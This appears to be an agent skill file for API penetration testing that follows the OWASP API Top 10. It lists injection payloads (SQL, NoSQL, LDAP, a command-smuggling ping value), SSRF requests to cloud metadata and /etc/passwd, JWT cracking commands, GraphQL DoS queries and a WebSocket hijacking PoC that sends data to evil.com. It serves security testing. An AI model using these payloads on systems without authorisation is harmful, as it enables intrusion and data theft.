# API Security Testing — Skill v1.0

## Overview
Dedicated skill for API security testing covering REST, GraphQL, gRPC, and WebSocket protocols. Based on OWASP API Security Top 10 methodology with real-world exploitation patterns.

## Prerequisites
- Caido / Burp Suite / Postman
- GraphQL introspection tools (GraphQL Voyager, inql, graphqlmap)
- WebSocket testing support (Caido WS tab)
- JWT analysis tools (jwt_tool, jwt.io)

---

## 1. API Reconnaissance & Discovery

### A. Endpoint Discovery
```
# Standard patterns
/api/v1/, /api/v2/, /api/v3/
/graphql, /gql, /query
/rest/, /swagger/, /docs, /openapi.json
/ws, /websocket, /socket.io
/grpc, /grpc.reflection
```

### B. Discovery Techniques
- Crawl JS bundles for API endpoint strings (`/api/`, `/graphql`, routes)
- Check response headers for version/api info (`X-API-Version`, `X-RateLimit-Remaining`)
- Directory brute-force with api-specific wordlists
- Check `OPTIONS *` and `OPTIONS /api/` for allowed methods
- For GraphQL: send `{"query":"query{__typename}"}` to test
- For gRPC: attempt gRPC reflection via `grpcurl -plaintext`

### C. Authentication Inventory
```
# Methods to check for each endpoint
No auth required
API Key in header (X-Api-Key, x-api-key, api_key)
Bearer JWT (Authorization: Bearer <token>)
Basic Auth (Authorization: Basic base64(user:pass))
Cookie-based session
OAuth 2.0 token
```

---

## 2. OWASP API Top 10 Testing

### API1: Broken Object Level Authorization (BOLA/IDOR)
```
# Test every endpoint with user-controlled IDs
GET /api/users/1234              → change to 1235, 1236
GET /api/orders/ORDER-001        → change to ORDER-002
GET /api/invoices/{id}/download  → try id of other users

# UUID enumeration
GET /api/users/uuid-xxxxxxxx → try other UUIDs from leaked sources
```

### API2: Broken Authentication
```
# JWT attacks
jwt_tool eyJhbGciOiJIUzI1NiIs... -X a      # alg:none attack
jwt_tool <token> -X k -pk public.pem       # RS256→HS256 key confusion
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt  # crack secret

# Session attacks
Check for predictable tokens (timestamp-based, sequential numeric)
Check for missing/weak token expiration
Check for token not invalidated on logout
```

### API3: Broken Object Property Level Authorization (Mass Assignment)
```
# Try adding extra fields to JSON body
POST /api/user/register
{"username":"test","password":"test","role":"admin","isAdmin":true,"credit":999999}

# Check for auto-binding
PUT /api/user/profile
{"name":"test","role":"admin"}   → adding role changes permissions
```

### API4: Unrestricted Resource Consumption
```
# Rate limit testing
for i in {1..1000}; do curl -s -o /dev/null -w "%{http_code}\n" "https://api.target.com/endpoint" ; done

# Pagination abuse
GET /api/users?limit=9999999      → server crash / out of memory
GET /api/users?page=1&size=10000  → large response
```

### API5: Broken Function Level Authorization
```
# Privilege escalation via endpoint access
GET /api/admin/users              → should reject non-admin
GET /api/users/me/roles           → check if admin endpoint accessible

# Method override
POST /api/users/delete
X-HTTP-Method-Override: DELETE
```

### API6: Mass Assignment (see API3)

### API7: Security Misconfiguration
```
# CORS testing
Origin: https://evil.com           → check if Access-Control-Allow-Origin reflects
Origin: null                        → null origin allowed

# Verbose error messages
POST /api/login with malformed body to trigger stack traces

# Default credentials
admin:admin, admin:password, administrator:administrator
```

### API8: Injection
```
# SQLi in API
GET /api/users?id=1' OR '1'='1
POST /api/search {"q": "' OR 1=1--"}

# NoSQLi in API
POST /api/login {"username":{"$gt":""},"password":{"$gt":""}}
POST /api/search {"$where":"sleep(5000)"}

# Command injection
GET /api/ping?host=127.0.0.1;id

# LDAP injection
GET /api/users?user=admin)(cn=*
```

### API9: Improper Asset Management
```
# Version enumeration
GET /api/v1/users           → old version
GET /api/v2/users           → current version
GET /api/v3/users           → beta version (may be less secure)

# Deprecated endpoints
/api/v1/users/debug
/api/old/
/api/experimental/
```

### API10: Unsafe Consumption of APIs
```
# SSRF via API webhooks
POST /api/webhooks
{"url": "http://169.254.169.254/latest/meta-data/"}    # cloud metadata
{"url": "http://internal-api.target.com/admin"}
{"url": "file:///etc/passwd"}
```

---

## 3. GraphQL Security Testing

### A. Introspection (Query Schema)
```
# Enable introspection — queries the full schema
{"query":"query{__schema{types{name fields{name type{name kind}}}}}"}

# If introspection disabled, try:
- Field suggestion errors (typos leak field names)
- Common field brute-force (id, name, email, password, token, role, secret)
```
Tools: `graphqlmap`, `inql`, `GraphQL Voyager`

### B. Query Depth DoS
```
query {
    user {
        posts { comments { user { posts { comments { ... } } } } }
    }
}
```
Try deeply nested queries (10+ levels) to cause DoS

### C. Alias-Based Batching
```
query {
    a1: user(id:1) { email }
    a2: user(id:2) { email }
    a3: user(id:3) { email }
    a4: user(id:4) { email }
    a5: user(id:5) { email }
    # up to thousands of aliases
}
```

### D. SQLi in GraphQL
```
query {
    user(id: "1' OR '1'='1") { email }
    search(query: "'; SELECT * FROM users --") { results }
}
```

### E. Auth Bypass
```
# Try queries without auth token
# Try role-based mutations
mutation {
    deleteUser(id: 1)
    updateUserRole(id: 1, role: admin)
}
```

---

## 4. WebSocket Security Testing

### A. Message Tampering
```
# Intercept WebSocket frames and modify
Original: {"action":"getBalance","userId":1}
Modified: {"action":"getBalance","userId":2}     → IDOR via WS

# Injection in WS messages
{"message":"test<script>alert(1)</script>"}

# SQLi via WS
{"query":"SELECT * FROM users WHERE id = '1' OR '1'='1"}
```

### B. Cross-Site WebSocket Hijacking (CSWSH)
```
# Test if Origin header is validated
1. Capture WebSocket connection handshake in Caido
2. Check if Origin header is required/validated
3. If not, create an HTML PoC:

<script>
    var ws = new WebSocket('wss://target.com/ws');
    ws.onopen = function() {
        ws.send(JSON.stringify({action:'getUserData'}));
    };
    ws.onmessage = function(e) {
        fetch('//evil.com/?data='+btoa(e.data));
    };
</script>
```

### C. WS Rate Limiting
```
# Send rapid messages to check rate limiting
# No rate limit = potential for brute-force / DoS
```

---

## 5. gRPC Security Testing

### A. Reflection Discovery
```
grpcurl -plaintext target.com:443 list
grpcurl -plaintext target.com:443 describe service.ServiceName
```

### B. Message Tampering
```
# Intercept and modify protobuf messages
# Look for:
- IDOR in message fields
- Mass assignment
- Authentication bypass
```

### C. Injection via gRPC
```
# String fields: SQLi, NoSQLi, XSS
# Numeric fields: integer overflow, negative values
```

---

## 6. API Security Checklist

```
□ API authentication discovered for all endpoints
□ BOLA/IDOR tested on all user-controlled IDs
□ Mass assignment tested on all write endpoints
□ Rate limit tested on auth and sensitive endpoints
□ Admin/privileged endpoints accessible without auth
□ CORS misconfiguration checked
□ GraphQL introspection checked
□ WebSocket origin validation checked
□ jwt_tool run on all JWT tokens
□ sqlmap run on all API parameters
□ Verbose errors exposed (stack traces, SQL errors)
□ Version enumeration (v1/v2/deprecated endpoints)
□ NoSQL injection tested on JSON body endpoints
□ SSRF via URL-consuming parameters
□ HTTP method override tested
```

---

## Output

```
=== API Security Assessment Summary ===
Target: {target}
Date: {date}

## API Inventory
| Endpoint | Method | Auth | Status | Notes |
|----------|--------|------|--------|-------|
| /api/v1/users | GET | Bearer JWT | 200 | Returns user list |
| /api/v2/users/{id} | GET | None | 200 | BOLA confirmed |
| /graphql | POST | Optional | 200 | Introspection ENABLED |
| /ws/chat | WS | None | 101 | No Origin check |

## OWASP API Top 10 Results
| Category | Tested | Vulnerable | Details |
|----------|--------|------------|---------|
| API1: BOLA | All object IDs | Yes | /api/users/1 → 2 leaked data |
| API2: Broken Auth | JWT tokens | No | Token properly validated |
| API3: Mass Assignment | POST/PUT bodies | Yes | role:admin accepted |
| API4: Rate Limiting | Auth endpoints | Yes | 1000 req/s no throttle |
| API5: BFLA | Admin endpoints | No | Proper RBAC |
| API7: Misconfig | CORS, errors | Yes | CORS: * origin allowed |
| API8: Injection | All params | Pending | Needs sqlmap run |
| API9: Asset Mgmt | Version enum | Yes | /v1/users debug endpoint active |

## GraphQL Analysis
- Introspection: Enabled / Disabled
- Sensitive Fields Exposed: {count} (password_hash, internal_notes)
- Query Depth DoS: Possible / Not possible (max depth: {n})
- Alias Batching: Limited / Unlimited

## WebSocket
- Origin Validation: Yes / No
- Message Injection Possible: SQLi / XSS / IDOR

## JWT Analysis
- Algorithm: RS256 / HS256
- alg:none attack: Possible / Blocked
- Secret Weakness: None / Crackable (/usr/share/wordlists/rockyou.txt)

## Next Phase: Exploitation
Feeds into: bug-bounty-exploitation (BOLA PoC, mass assignment chain, GraphQL injection)
Feeds into: bug-bounty-reporting (API endpoint details, request/response pairs)
```

---

## References
- Anthropic-Cybersecurity-Skills: `conducting-api-security-testing`, `testing-api-for-broken-object-level-authorization`, `testing-api-authentication-weaknesses`, `testing-api-for-mass-assignment-vulnerability`, `performing-api-rate-limiting-bypass`, `performing-graphql-security-assessment`, `testing-websocket-api-security`
- Claude-BugHunter: `hunt-api-misconfig`, `hunt-graphql`, `hunt-grpc`, `hunt-websocket`, `hunt-idor`, `hunt-oauth`
- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
